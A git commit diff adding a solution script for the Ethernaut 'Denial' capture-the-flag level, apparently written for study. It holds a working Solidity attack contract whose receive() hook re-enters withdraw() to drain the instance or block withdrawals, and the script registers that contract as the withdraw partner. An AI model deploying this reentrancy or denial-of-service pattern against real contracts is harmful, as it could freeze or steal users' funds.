6fb1d749c144ac5e7557726a863ca9ee4f9ed8e7
LouisTsai <q1030176@gmail.com>
2024-01-05 17:27:53 +0800

    feat: complete 20 denial challenge

--- script/solutions/20-Denial.s.sol
+++ script/solutions/20-Denial.s.sol
@@ -5,6 +5,24 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+interface IDenial {
+    function setWithdrawPartner(address _partner) external;
+    function withdraw() external;
+    function contractBalance() external view;
+}
+
+contract Attack {
+    address internal instance;
+    constructor(address addr) {
+        instance = addr;
+    }
+
+    receive() external payable {
+        if(instance.balance>0) {
+            IDenial(instance).withdraw();
+        }
+    }
+}
 
 contract DenialSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x2427aF06f748A6adb651aCaB0cA8FbC7EaF802e6;
@@ -15,9 +33,8 @@ contract DenialSolution is Script, EthernautHelper {
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // YOUR SOLUTION HERE
-
-
+        Attack attack = new Attack(challengeInstance);
+        IDenial(challengeInstance).setWithdrawPartner(address(attack));
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
